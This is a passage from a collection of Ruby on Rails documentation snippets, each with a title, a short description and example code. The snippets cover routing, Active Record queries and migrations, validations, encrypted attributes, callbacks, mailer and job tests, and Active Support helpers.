[0, 1, -5, 1, 1, "foo", "bar"].split(1)
# => [[0], [-5], [], ["foo", "bar"]]

----------------------------------------

TITLE: Disabling Wrap Parameters in Rails Configuration
DESCRIPTION: Configuration example showing how to disable the automatic wrapping of parameters in Rails controllers by setting wrap_parameters_by_default to false.

LANGUAGE: ruby
CODE:
config.action_controller.wrap_parameters_by_default = false

----------------------------------------

TITLE: Error Handling in Partial Templates
DESCRIPTION: Example demonstrating that using undefined variables in partials raises an ActionView::Template::Error.

LANGUAGE: html+erb
CODE:
<%# app/views/products/_product.html.erb %>

<%= tag.div id: dom_id(my_product) do %>
  <h1><%= my_product.name %></h1>

  <%# => raises ActionView::Template::Error for `product_reviews` %>
  <% product_reviews.each do |review| %>
    <%# ... %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Testing HTML Content with assert_dom
DESCRIPTION: Example of using assert_dom to test the content of HTML elements in a view test. This asserts that the page title matches the expected text.

LANGUAGE: ruby
CODE:
assert_dom "title", "Welcome to the Rails Testing Guide"

----------------------------------------

TITLE: Implementing a Custom Compression Algorithm for Encryption
DESCRIPTION: Creates and configures a custom compression algorithm for encrypted attributes using Zstandard compression. The compressor must implement deflate and inflate methods.

LANGUAGE: ruby
CODE:
require "zstd-ruby"

module ZstdCompressor
  def self.deflate(data)
    Zstd.compress(data)
  end

  def self.inflate(data)
    Zstd.decompress(data)
  end
end

class User
  encrypts :name, compressor: ZstdCompressor
end

----------------------------------------

TITLE: Complex Wildcard Segments with Named Parameters in Rails Routes
DESCRIPTION: Shows how to use wildcard segments combined with named parameters in a route. This allows capturing both the section (wildcard) and title (named parameter) parts of the URL.

LANGUAGE: ruby
CODE:
get "books/*section/:title", to: "books#show"

----------------------------------------

TITLE: Validating Model Instances in Rails Console
DESCRIPTION: Shows how validation prevents saving an invalid model instance. When attempting to save a Product without a name, the save method returns false because the validation fails.

LANGUAGE: irb
CODE:
store(dev)> product = Product.new
store(dev)> product.save
=> false

----------------------------------------

TITLE: Time Range Methods in Ruby (all_week, all_month, all_quarter, all_year)
DESCRIPTION: Methods for generating time ranges for specific time periods including weeks, months, quarters, and years.

LANGUAGE: ruby
CODE:
now = Time.current
# => Mon, 09 Aug 2010 23:20:05 UTC +00:00
now.all_week
# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..Sun, 15 Aug 2010 23:59:59 UTC +00:00
now.all_week(:sunday)
# => Sun, 16 Sep 2012 00:00:00 UTC +00:00..Sat, 22 Sep 2012 23:59:59 UTC +00:00
now.all_month
# => Sat, 01 Aug 2010 00:00:00 UTC +00:00..Tue, 31 Aug 2010 23:59:59 UTC +00:00
now.all_quarter
# => Thu, 01 Jul 2010 00:00:00 UTC +00:00..Thu, 30 Sep 2010 23:59:59 UTC +00:00
now.all_year
# => Fri, 01 Jan 2010 00:00:00 UTC +00:00..Fri, 31 Dec 2010 23:59:59 UTC +00:00

----------------------------------------

TITLE: Using Custom Validation Contexts in Rails Console
DESCRIPTION: Demonstrates how to trigger custom validation contexts in Rails console using valid? method with context name. This shows that custom contexts need to be explicitly triggered and don't run during normal validation.

LANGUAGE: ruby
CODE:
irb> person = Person.new(age: 'thirty-three')
irb> person.valid?
=> true
irb> person.valid?(:account_setup)
=> false
irb> person.errors.messages
=> {:email=>["has already been taken"], :age=>["is not a number"]}

----------------------------------------

TITLE: Anti-Pattern: Caching Active Record Objects
DESCRIPTION: This code demonstrates an anti-pattern that should be avoided: caching Active Record objects directly. This can lead to inconsistencies as the objects might change in the database but remain stale in the cache.

LANGUAGE: ruby
CODE:
# super_admins is an expensive SQL query, so don't run it too often
Rails.cache.fetch("super_admin_users", expires_in: 12.hours) do
  User.super_admins.to_a
end

----------------------------------------

TITLE: Selecting Specific Fields in ActiveRecord Queries
DESCRIPTION: Shows how to select only specific columns from database tables instead of fetching all fields with SELECT *.

LANGUAGE: ruby
CODE:
Book.select(:isbn, :out_of_print)

----------------------------------------

TITLE: Displaying Comments in an Article View in Rails Engine
DESCRIPTION: Adds HTML and ERB code to display comments associated with an article in the article show view.

LANGUAGE: html
CODE:
<h3>Comments</h3>
<%= render @article.comments %>

----------------------------------------

TITLE: Creating and Using Interval Data Types in Rails
DESCRIPTION: Shows how to set up an interval data type in a Rails migration and use it with ActiveSupport::Duration objects. The interval column stores duration values that can be easily manipulated.

LANGUAGE: ruby
CODE:
# db/migrate/20200120000000_create_events.rb
create_table :events do |t|
  t.interval "duration"
end

LANGUAGE: ruby
CODE:
# app/models/event.rb
class Event < ApplicationRecord
end

LANGUAGE: irb
CODE:
irb> Event.create(duration: 2.days)

irb> event = Event.first
irb> event.duration
=> 2 days

----------------------------------------

TITLE: Configuring Encoding for Deterministic Encryption
DESCRIPTION: Sets the forced encoding to be used for deterministic encryption. This configuration ensures consistency in the ciphertext generated for the same value, which is important for queries and uniqueness constraints.

LANGUAGE: ruby
CODE:
config.active_record.encryption.forced_encoding_for_deterministic_encryption = Encoding::US_ASCII

----------------------------------------

TITLE: Enabling Per-form CSRF Tokens
DESCRIPTION: Rails 5 adds support for per-form CSRF tokens to enhance security against code-injection attacks with JavaScript-generated forms. This configuration enables the feature.

LANGUAGE: ruby
CODE:
config.action_controller.per_form_csrf_tokens = true

----------------------------------------

TITLE: Manual Object Serialization for Active Job in Rails
DESCRIPTION: Demonstrates how to manually serialize and deserialize objects for job processing without GlobalID, requiring explicit finding of records by their class and ID.

LANGUAGE: ruby
CODE:
class TrashableCleanupJob < ApplicationJob
  def perform(trashable_class, trashable_id, depth)
    trashable = trashable_class.constantize.find(trashable_id)
    trashable.cleanup(depth)
  end
end

----------------------------------------

TITLE: Customizing Batch Size in find_in_batches in Rails
DESCRIPTION: Shows how to set a custom batch size when using find_in_batches to process records in larger chunks of 2500 instead of the default 1000 records per batch.

LANGUAGE: ruby
CODE:
Customer.find_in_batches(batch_size: 2500) do |customers|
  export.add_customers(customers)
end

----------------------------------------

TITLE: Defining Default Parameters for Multiple Resources in Rails
DESCRIPTION: Uses a defaults block to set default parameters for multiple resource definitions at once. This applies the same defaults to all contained routes.

LANGUAGE: ruby
CODE:
defaults format: :json do
  resources :photos
  resources :articles
end

----------------------------------------

TITLE: Implementing Session Expiry in Rails Using Database Sweeping
DESCRIPTION: This code snippet defines a self.sweep method in a Session model to expire sessions that haven't been used for a specified time period. It deletes records from the sessions table based on their updated_at timestamp.

LANGUAGE: ruby
CODE:
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end

----------------------------------------

TITLE: Retrieving the First Record with Active Record in Ruby on Rails
DESCRIPTION: The first method finds the first record ordered by primary key. It returns nil if no matching record is found and accepts an optional numerical argument to return multiple records.

LANGUAGE: irb
CODE:
irb> customer = Customer.first
=> #<Customer id: 1, first_name: "Lifo">

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.id ASC LIMIT 1

LANGUAGE: irb
CODE:
irb> customers = Customer.first(3)
=> [#<Customer id: 1, first_name: "Lifo">, #<Customer id: 2, first_name: "Fifo">, #<Customer id: 3, first_name: "Filo">]

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.id ASC LIMIT 3

LANGUAGE: irb
CODE:
irb> customer = Customer.first
=> #<Customer id: 2, store_id: 1, first_name: "Lifo">

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.store_id ASC, customers.id ASC LIMIT 1

LANGUAGE: irb
CODE:
irb> customer = Customer.order(:first_name).first
=> #<Customer id: 2, first_name: "Fifo">

LANGUAGE: sql
CODE:
SELECT * FROM customers ORDER BY customers.first_name ASC LIMIT 1

----------------------------------------

TITLE: Using delegate_missing_to for Missing Method Delegation in Ruby
DESCRIPTION: Demonstrates how to delegate all missing methods to another object using the delegate_missing_to macro, which delegates any methods not defined on the receiver to the target.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_one :profile

  delegate_missing_to :profile
end

----------------------------------------

TITLE: Using Hash with Indifferent Access in Ruby on Rails
DESCRIPTION: Example of how to use HashWithIndifferentAccess which permits accessing hash keys as either strings or symbols.

LANGUAGE: ruby
CODE:
{ a: 1 }.with_indifferent_access["a"] # => 1

----------------------------------------

TITLE: Modifying a Table with change_table
DESCRIPTION: Migration that modifies an existing table using change_table method to remove columns, add a new column, create an index, and rename a column in a single operation.

LANGUAGE: ruby
CODE:
change_table :products do |t|
  t.remove :description, :name
  t.string :part_number
  t.index :part_number
  t.rename :upccode, :upc_code
end

----------------------------------------

TITLE: Building has_one Associations in Rails
DESCRIPTION: This snippet shows how to build a new associated object using the build_association method. This creates a new unsaved object with the specified attributes and sets up the foreign key relationship.

LANGUAGE: ruby
CODE:
@account = @supplier.build_account(terms: "Net 30")

----------------------------------------

TITLE: Installing Rails 3 with RubyGems
DESCRIPTION: Shows how to install Rails 3 using the gem command. This command uses RubyGems package manager to download and install the Rails framework and its dependencies.

LANGUAGE: bash
CODE:
# Use sudo if your setup requires it
$ gem install rails

----------------------------------------

TITLE: Creating a Comment Partial for Display
DESCRIPTION: Creates a partial view for rendering individual comments, using a counter to number comments and displaying the comment text.

LANGUAGE: html
CODE:
<%= comment_counter + 1 %>. <%= comment.text %>

----------------------------------------

TITLE: Case-Insensitive Deterministic Encryption Preserving Original Case
DESCRIPTION: Example of using the ignore_case option to enable case-insensitive queries while preserving the original case in a separate column.

LANGUAGE: ruby
CODE:
class Label
  encrypts :name, deterministic: true, ignore_case: true # the content with the original case will be stored in the column `original_name`
end

----------------------------------------

TITLE: Demonstrating String#titleize Method in Ruby on Rails
DESCRIPTION: Examples showing how titleize capitalizes each word in a string, useful for formatting text for display in user interfaces.

LANGUAGE: ruby
CODE:
"alice in wonderland".titleize # => "Alice In Wonderland"
"fermat's enigma".titleize     # => "Fermat's Enigma"

----------------------------------------

TITLE: Generated HTML for Nested Form Fields
DESCRIPTION: Shows the HTML output generated by fields_for when working with nested attributes. The name attributes follow the structure expected by accepts_nested_attributes_for.

LANGUAGE: html
CODE:
<form action="/people" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="lWTbg-4_5i4rNe6ygRFowjDfTj7uf-6UPFQnsL7H9U9Fe2GGUho5PuOxfcohgm2Z-By3veuXwcwDIl-MLdwFRg" autocomplete="off">
  Addresses:
  <ul>
      <li>
        <label for="person_addresses_attributes_0_kind">Kind</label>
        <input type="text" name="person[addresses_attributes][0][kind]" id="person_addresses_attributes_0_kind">

        <label for="person_addresses_attributes_0_street">Street</label>
        <input type="text" name="person[addresses_attributes][0][street]" id="person_addresses_attributes_0_street">
        ...
      </li>

      <li>
        <label for="person_addresses_attributes_1_kind">Kind</label>
        <input type="text" name="person[addresses_attributes][1][kind]" id="person_addresses_attributes_1_kind">

        <label for="person_addresses_attributes_1_street">Street</label>
        <input type="text" name="person[addresses_attributes][1][street]" id="person_addresses_attributes_1_street">
        ...
      </li>
  </ul>
</form>

----------------------------------------

TITLE: Creating a Form with Rich Text Editor
DESCRIPTION: ERB template showing how to create a form with a rich text editor using the rich_textarea form helper, which renders the Trix editor for the specified attribute.

LANGUAGE: html+erb
CODE:
<%# app/views/articles/_form.html.erb %>
<%= form_with model: article do |form| %>
  <div class="field">
    <%= form.label :content %>
    <%= form.rich_textarea :content %>
  </div>
<% end %>

----------------------------------------

TITLE: Creating a Rake task that interacts with Rails application code
DESCRIPTION: Define a Rake task that depends on the environment task, which loads the Rails application. This allows the task to use models, run queries, and access application code.

LANGUAGE: ruby
CODE:
task task_that_requires_app_code: [:environment] do
  User.create!
end

----------------------------------------

TITLE: Converting Hashes to XML in Ruby on Rails
DESCRIPTION: Shows how to convert Ruby hashes to XML using the to_xml method. The method handles different value types appropriately and creates appropriate XML structures with correct type annotations.

LANGUAGE: ruby
CODE:
{ foo: 1, bar: 2 }.to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <hash>
#   <foo type="integer">1</foo>
#   <bar type="integer">2</bar>
# </hash>

----------------------------------------

TITLE: Implementing Touch Callbacks in Rails Model
DESCRIPTION: Example showing how to implement after_touch callbacks in a User model. This callback is triggered whenever a record's updated_at timestamp is updated using the touch method, enabling additional actions when records are marked as updated.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  after_touch do |user|
    Rails.logger.info("You have touched an object")
  end
end

----------------------------------------

TITLE: Generating an Integration Test in Rails
DESCRIPTION: This command generates a skeleton for an integration test named user_flows using the Rails generator. It creates a test file in the test/integration directory.

LANGUAGE: bash
CODE:
$ bin/rails generate integration_test user_flows
      invoke  test_unit
      create  test/integration/user_flows_test.rb

----------------------------------------

TITLE: Adding Login Link in Navbar for Unauthenticated Users
DESCRIPTION: Demonstrates how to add a conditional login link in the navbar that only displays when the user is not authenticated. Uses the authenticated? helper method with unless condition.

LANGUAGE: erb
CODE:
<%= link_to "Login", new_session_path unless authenticated? %>

----------------------------------------

TITLE: Seeding Database with Initial Data in Rails
DESCRIPTION: An example of using Rails' seeds feature to populate a database with initial data. This code adds movie genres to the database in an idempotent manner, making it suitable for execution in any environment.

LANGUAGE: ruby
CODE:
["Action", "Comedy", "Drama", "Horror"].each do |genre_name|
  MovieGenre.find_or_create_by!(name: genre_name)
end

----------------------------------------

TITLE: Testing Enqueued Emails with Named Arguments in Rails
DESCRIPTION: Shows how to test that an email is correctly enqueued with named arguments using the assert_enqueued_email_with assertion. This example tests a mailer method that accepts a hash of arguments.

LANGUAGE: ruby
CODE:
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite(from: "me@example.com", to: "friend@example.com")

    # Test that the email got enqueued with the correct named arguments
    assert_enqueued_email_with UserMailer, :create_invite,
    args: [{ from: "me@example.com", to: "friend@example.com" }] do
      email.deliver_later
    end
  end
end

----------------------------------------

TITLE: Checking Object Change Status with changed? in Rails
DESCRIPTION: Shows the changed? method returning true when attributes have unsaved changes. This method is part of ActiveModel::Dirty tracking system.

LANGUAGE: irb
CODE:
irb> person.changed?
=> true

----------------------------------------

TITLE: Customizing Acceptance Validation Error Message
DESCRIPTION: Example showing how to customize the error message for an acceptance validation using the message option.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :terms_of_service, acceptance: { message: "must be agreed to" }
end

----------------------------------------

TITLE: Configuring Development Environment in Rails 3.2
DESCRIPTION: Configuration for development environment in Rails 3.2, including mass assignment protection and query plan logging for performance debugging.

LANGUAGE: ruby
CODE:
# Raise exception on mass assignment protection for Active Record models
config.active_record.mass_assignment_sanitizer = :strict

# Log the query plan for queries taking more than this (works
# with SQLite, MySQL, and PostgreSQL)
config.active_record.auto_explain_threshold_in_seconds = 0.5

----------------------------------------

TITLE: Defining Specific Callback Types in ActiveModel
DESCRIPTION: This snippet shows how to define specific callback types using the 'only' option with define_model_callbacks. It demonstrates creating only before/after callbacks while skipping around callbacks, and how to define different callback types for different lifecycle events.

LANGUAGE: ruby
CODE:
define_model_callbacks :update, :create, only: [:after, :before]

----------------------------------------

TITLE: Running the Rails about command to display environment information
DESCRIPTION: The bin/rails about command shows version numbers for Ruby, RubyGems, Rails, database adapter, schema version, and other environment details. Useful for troubleshooting and support.

LANGUAGE: bash
CODE:
$ bin/rails about
About your application's environment
Rails version             8.1.0
Ruby version              3.2.0 (x86_64-linux)
RubyGems version          3.3.7
Rack version              3.0.8
JavaScript Runtime        Node.js (V8)
Middleware:               ActionDispatch::HostAuthorization, Rack::Sendfile, ActionDispatch::Static, ActionDispatch::Executor, ActionDispatch::ServerTiming, ActiveSupport::Cache::Strategy::LocalCache::Middleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, ActionDispatch::RemoteIp, Sprockets::Rails::QuietAssets, Rails::Rack::Logger, ActionDispatch::ShowExceptions, WebConsole::Middleware, ActionDispatch::DebugExceptions, ActionDispatch::ActionableExceptions, ActionDispatch::Reloader, ActionDispatch::Callbacks, ActiveRecord::Migration::CheckPending, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ContentSecurityPolicy::Middleware, ActionDispatch::PermissionsPolicy::Middleware, Rack::Head, Rack::ConditionalGet, Rack::ETag, Rack::TempfileReaper
Application root          /home/foobar/my_app
Environment               development
Database adapter          sqlite3
Database schema version   20180205173523

----------------------------------------

TITLE: Testing Broadcasts in Rails Jobs with Action Cable
DESCRIPTION: Example of testing that a job properly broadcasts messages through Action Cable. It demonstrates testing a ChatRelayJob that broadcasts messages to a specific room, using broadcast_to and broadcasting_for.

LANGUAGE: ruby
CODE:
# app/jobs/chat_relay_job.rb
class ChatRelayJob < ApplicationJob
  def perform(room, message)
    ChatChannel.broadcast_to room, text: message
  end
end

LANGUAGE: ruby
CODE:
# test/jobs/chat_relay_job_test.rb
require "test_helper"

class ChatRelayJobTest < ActiveJob::TestCase
  include ActionCable::TestHelper

  test "broadcast message to room" do
    room = rooms(:all)

    assert_broadcast_on(ChatChannel.broadcasting_for(room), text: "Hi!") do
      ChatRelayJob.perform_now(room, "Hi!")
    end
  end
end

----------------------------------------

TITLE: Using beginning_of_day and end_of_day with Date objects in Ruby on Rails
DESCRIPTION: These methods return timestamps at the beginning (00:00:00) and end (23:59:59) of the day. The beginning_of_day method has several aliases including midnight and at_beginning_of_day.

LANGUAGE: ruby
CODE:
date = Date.new(2010, 6, 7)
date.beginning_of_day # => Mon Jun 07 00:00:00 +0200 2010

LANGUAGE: ruby
CODE:
date = Date.new(2010, 6, 7)
date.end_of_day # => Mon Jun 07 23:59:59 +0200 2010

----------------------------------------

TITLE: Installing Action Mailbox in Rails
DESCRIPTION: Commands to install Action Mailbox and run the necessary migrations. This creates the application_mailbox.rb file and sets up the required database tables.

LANGUAGE: bash
CODE:
$ bin/rails action_mailbox:install

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Setting Locale from Subdomain in Rails
DESCRIPTION: Shows how to extract and use the locale from a request subdomain (like it.application.local) in a Rails application. Includes instructions for testing this approach locally.

LANGUAGE: ruby
CODE:
# Get locale code from request subdomain (like http://it.application.local:3000)
# You have to put something like:
#   127.0.0.1 it.application.local
# in your /etc/hosts file to try this out locally
#
# Additionally, you need to add the following configuration to your config/environments/development.rb:

----------------------------------------

TITLE: Enabling Encrypted Fixtures in Test Environment
DESCRIPTION: Configuration to automatically encrypt fixture data for tests based on the model's encryption settings.

LANGUAGE: ruby
CODE:
config.active_record.encryption.encrypt_fixtures = true

----------------------------------------

TITLE: Implementing Initial Acts As Yaffle Module
DESCRIPTION: Basic implementation of the ActsAsYaffle module with concern and class methods. This establishes the structure for the Active Record extension.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle/acts_as_yaffle.rb

module Yaffle
  module ActsAsYaffle
    extend ActiveSupport::Concern

    class_methods do
      def acts_as_yaffle(options = {})
      end
    end
  end
end

----------------------------------------

TITLE: Dynamic Queue Selection Based on Job Arguments in Ruby on Rails
DESCRIPTION: This example demonstrates how to dynamically select a queue for a job based on its arguments by passing a block to queue_as. The block evaluates the arguments and returns the appropriate queue name.

LANGUAGE: ruby
CODE:
class ProcessVideoJob < ApplicationJob
  queue_as do
    video = self.arguments.first
    if video.owner.premium?
      :premium_videojobs
    else
      :videojobs
    end
  end

  def perform(video)
    # Do process video
  end
end

----------------------------------------

TITLE: Changing Column Type
DESCRIPTION: Migration that changes the data type of an existing column using the change_column method. This example changes part_number to a text field.

LANGUAGE: ruby
CODE:
change_column :products, :part_number, :text

----------------------------------------

TITLE: Naming Routes with the :as Option in Rails
DESCRIPTION: Customizes route helper names using the :as option. This affects the names of the generated path and URL helper methods.

LANGUAGE: ruby
CODE:
get "exit", to: "sessions#destroy", as: :logout

----------------------------------------

TITLE: Implementing Key-Value Stores with ActiveRecord::Base.store
DESCRIPTION: Example of using the new store method in ActiveRecord::Base for declaring simple single-column key/value stores. This allows storing multiple attributes in a single serialized column with accessor methods.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  store :settings, accessors: [ :color, :homepage ]
end

u = User.new(color: 'black', homepage: '37signals.com')
u.color                          # Accessor stored attribute
u.settings[:country] = 'Denmark' # Any attribute, even if not specified with an accessor

----------------------------------------

TITLE: Disabling Advisory Locks for MySQL in Rails
DESCRIPTION: This configuration demonstrates how to disable advisory locks for MySQL databases. Advisory locks are enabled by default and used to make database migrations concurrent safe.

LANGUAGE: yaml
CODE:
production:
  adapter: mysql2
  advisory_locks: false

----------------------------------------

TITLE: Finding multiple customers with composite primary keys in Ruby using Active Record
DESCRIPTION: Example of finding multiple records using composite primary keys by passing an array of arrays to the find method.

LANGUAGE: ruby
CODE:
# Find the customers with primary keys [1, 8] and [7, 15].
irb> customers = Customer.find([[1, 8], [7, 15]]) # OR Customer.find([1, 8], [7, 15])
=> [#<Customer store_id: 1, id: 8, first_name: "Pat">, #<Customer store_id: 7, id: 15, first_name: "Chris">]

----------------------------------------

TITLE: Specifying Custom Singular Form for a Resource in Rails
DESCRIPTION: Shows how to override the singular form of a resource by adding a rule to Active Support Inflector. This is useful for resources with irregular singular and plural forms.

LANGUAGE: ruby
CODE:
ActiveSupport::Inflector.inflections do |inflect|
  inflect.irregular "tooth", "teeth"
end

----------------------------------------

TITLE: Implementing ActiveModel::Conversion in Ruby
DESCRIPTION: This code shows how to include ActiveModel::Conversion in a model class. The Person class implements the required persisted? method which indicates whether the object has been saved to a database, and has an id attribute to identify the object.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Conversion
  attr_accessor :id

  def initialize(id)
    @id = id
  end

  def persisted?
    id.present?
  end
end

----------------------------------------

TITLE: Adding New Product Link to Products Index Page in Rails ERB
DESCRIPTION: Updates the products index view to include a link to create a new product using the Rails link_to helper, which generates a link to the new_product_path route.

LANGUAGE: erb
CODE:
<h1>Products</h1>

<%= link_to "New product", new_product_path %>

<div id="products">
  <% @products.each do |product| %>
    <div>
      <%= link_to product.name, product_path(product.id) %>
    </div>
  <% end %>
</div>

----------------------------------------

TITLE: Testing Email Delivery in Rails Console
DESCRIPTION: Example IRB console commands to test the in-stock email delivery functionality.

LANGUAGE: irb
CODE:
store(dev)> product = Product.first
store(dev)> subscriber = product.subscribers.find_or_create_by(email: "subscriber@example.org")
store(dev)> ProductMailer.with(product: product, subscriber: subscriber).in_stock.deliver_later

----------------------------------------

TITLE: Using uniq Method in ActiveRecord Relations
DESCRIPTION: Shows how to use the new uniq method for generating unique queries. This provides a more object-oriented approach to SQL DISTINCT operations and can be toggled on and off.

LANGUAGE: ruby
CODE:
Client.select('DISTINCT name')

----------------------------------------

TITLE: Using foreign_key Without Underscore in Ruby on Rails
DESCRIPTION: Example showing how to use foreign_key to generate a foreign key column name without the underscore in '_id'.

LANGUAGE: ruby
CODE:
"User".foreign_key(false) # => "userid"

----------------------------------------

TITLE: Setting Up ActiveModel::Naming in a Ruby Class
DESCRIPTION: Shows how to include ActiveModel::Naming in a class to enable various naming-related helper methods. This module helps with naming conventions and routing.

LANGUAGE: ruby
CODE:
class Person
  extend ActiveModel::Naming
end

----------------------------------------

TITLE: Creating a User in Production Database
DESCRIPTION: Ruby code to create a new user record in the production database, used for administrative access to the application.

LANGUAGE: ruby
CODE:
store(prod)> User.create!(email_address: "you@example.org", password: "s3cr3t", password_confirmation: "s3cr3t")

----------------------------------------

TITLE: Implementing undecorated_table_name Method in Active Record Model Schema
DESCRIPTION: This method takes a model name and returns an underscored table name, optionally pluralizing it based on configuration. It's part of the Active Record schema system.

LANGUAGE: ruby
CODE:
def undecorated_table_name(model_name)
  table_name = model_name.to_s.demodulize.underscore
  pluralize_table_names ? table_name.pluralize : table_name
end

----------------------------------------

TITLE: Rails URL Helper with Default Parameters
DESCRIPTION: This example shows how the default URL options are automatically applied when using Rails path helpers. The locale parameter is added to the URL automatically.

LANGUAGE: ruby
CODE:
posts_path # => "/posts?locale=en"

----------------------------------------

TITLE: Using Lambda in Block Form for Route Constraints in Rails
DESCRIPTION: Demonstrates applying a lambda constraint to multiple routes using a block form. This approach allows applying the same IP restriction logic to several routes without repeating code.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  constraints(lambda { |request| RestrictedList.retrieve_ips.include?(request.remote_ip) }) do
    get "*path", to: "restricted_list#index"
    get "*other-path", to: "other_restricted_list#index"
  end
end

----------------------------------------

TITLE: Merging Hashes with reverse_merge in Rails
DESCRIPTION: Demonstrates the reverse_merge and reverse_merge! methods which provide an alternative notation for merging hashes where the keys in the receiver hash take precedence over those in the argument.

LANGUAGE: ruby
CODE:
{ a: 1, b: 1 }.merge(a: 0, c: 2)
# => {:a=>0, :b=>1, :c=>2}

LANGUAGE: ruby
CODE:
options = { length: 30, omission: "..." }.merge(options)

LANGUAGE: ruby
CODE:
options = options.reverse_merge(length: 30, omission: "...")

LANGUAGE: ruby
CODE:
options.reverse_merge!(length: 30, omission: "...")

----------------------------------------

TITLE: Deleting Records Directly from Database in Rails
DESCRIPTION: Shows how to delete records from the database without triggering callbacks or validations using delete and delete_all methods. These methods are faster but bypass model lifecycle hooks.

LANGUAGE: ruby
CODE:
Book.find_by(title: "The Lord of the Rings").delete
Book.delete_all

----------------------------------------

TITLE: Alternative Namespacing with Existing Model in Rails
DESCRIPTION: Shows how to keep an existing Book model while still having namespaced models like Book::Order. This approach automatically creates the table name 'book_orders' without requiring a table_name_prefix.

LANGUAGE: ruby
CODE:
# app/models/book.rb
class Book < ApplicationRecord
  # existing code
end

Book::Order.table_name
# => "book_orders"

----------------------------------------

TITLE: Multiple Association Callbacks with Parameters
DESCRIPTION: Shows how to stack multiple callbacks for a single association event by passing them as an array. Each callback receives the object being added or removed as a parameter.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books, before_add: [:check_limit, :calculate_shipping_charges]

  def check_limit(_book)
    if books.count >= 5
      errors.add(:base, "Cannot add more than 5 books for this author")
      throw(:abort)
    end
  end

  def calculate_shipping_charges(book)
    weight_in_pounds = book.weight_in_pounds || 1
    shipping_charges = weight_in_pounds * 2

    shipping_charges
  end
end

----------------------------------------

TITLE: Handling Validation Errors in Ruby IRB Console
DESCRIPTION: This example shows how to access validation errors after running validations. It demonstrates retrieving errors as a hash and as full messages for display purposes.

LANGUAGE: ruby
CODE:
irb> person = Person.new

irb> person.email = "me"
irb> person.valid?
=> # Raises Token can't be blank (ActiveModel::StrictValidationFailed)

irb> person.errors.to_hash
=> {:name => ["can't be blank"], :email => ["is invalid"]}

irb> person.errors.full_messages
=> ["Name can't be blank", "Email is invalid"]

----------------------------------------

TITLE: Alternative Approach for Testing Parameterized Emails in Rails
DESCRIPTION: Shows an alternative way to test parameterized emails using the with method directly on the mailer class when calling assert_enqueued_email_with. This approach is more concise for simple cases.

LANGUAGE: ruby
CODE:
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.with(to: "friend@example.com").create_invite

    # Test that the email got enqueued with the correct mailer parameters
    assert_enqueued_email_with UserMailer.with(to: "friend@example.com"), :create_invite do
      email.deliver_later
    end
  end
end

----------------------------------------

TITLE: Customizing Table Names in Rails Models
DESCRIPTION: Demonstrates how to override the default table naming convention by explicitly setting the table_name property in a model. This allows connecting to differently named tables, such as legacy database tables.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  self.table_name = "my_books"
end

----------------------------------------

TITLE: Inspecting Validation Errors in Rails Console
DESCRIPTION: Interactive Ruby (irb) console examples showing how to inspect validation errors on an object. Demonstrates checking errors before and after attempting to save an invalid object.

LANGUAGE: ruby
CODE:
irb> new_person = Person.new
irb> new_person.errors[:name]
=> [] # no errors since validations are not run until saved
irb> new_person.errors[:name].any?
=> false

irb> create_person = Person.create
irb> create_person.errors[:name]
=> ["can't be blank"] # validation error because `name` is required
irb> create_person.errors[:name].any?
=> true

----------------------------------------

TITLE: Using Hash Options in Arrays with url_for in Rails
DESCRIPTION: Rails now supports passing a hash with options inside an array to the url_for helper method.

LANGUAGE: ruby
CODE:
#url_for takes a hash with options inside an array.

----------------------------------------

TITLE: Aborting Callbacks in ActiveModel with throw :abort
DESCRIPTION: This example demonstrates how to abort the callback chain by throwing :abort. The Person class defines before, after, and around callbacks for update, but the before_update callback throws :abort to prevent the remaining callbacks and the actual update from executing.

LANGUAGE: ruby
CODE:
class Person
  extend ActiveModel::Callbacks

  define_model_callbacks :update

  before_update :reset_me
  after_update :finalize_me
  around_update :log_me

  def update
    run_callbacks(:update) do
      puts "update method called"
    end
  end

  private
    def reset_me
      puts "reset_me method: called before the update method"
      throw :abort
      puts "reset_me method: some code after abort"
    end

    def finalize_me
      puts "finalize_me method: called after the update method"
    end

    def log_me
      puts "log_me method: called around the update method"
      yield
      puts "log_me method: block successfully called"
    end
end

----------------------------------------

TITLE: Using Hash Conditions in ActiveRecord Queries
DESCRIPTION: Demonstrates using hash syntax for equality conditions in Rails, which provides a cleaner and more readable way to specify simple query conditions.

LANGUAGE: ruby
CODE:
Book.where(out_of_print: true)

----------------------------------------

TITLE: Testing View Partials in Rails with ActionView::TestCase
DESCRIPTION: Shows how to test a view partial in Rails using ActionView::TestCase. This example tests that an article partial correctly renders the article title and includes a link to the article.

LANGUAGE: ruby
CODE:
class ArticlePartialTest < ActionView::TestCase
  test "renders a link to itself" do
    article = Article.create! title: "Hello, world"

    render "articles/article", article: article

    assert_includes rendered, article.title
  end
end

----------------------------------------

TITLE: Demonstrating constantize Scope Resolution in Ruby on Rails
DESCRIPTION: Examples showing how constantize always starts constant resolution from the top-level Object, regardless of the current scope.

LANGUAGE: ruby
CODE:
X = :in_Object
module M
  X = :in_M

  X                 # => :in_M
  "::X".constantize # => :in_Object
  "X".constantize   # => :in_Object (!)
end

----------------------------------------

TITLE: Defining Different Callback Types for Different Events in ActiveModel
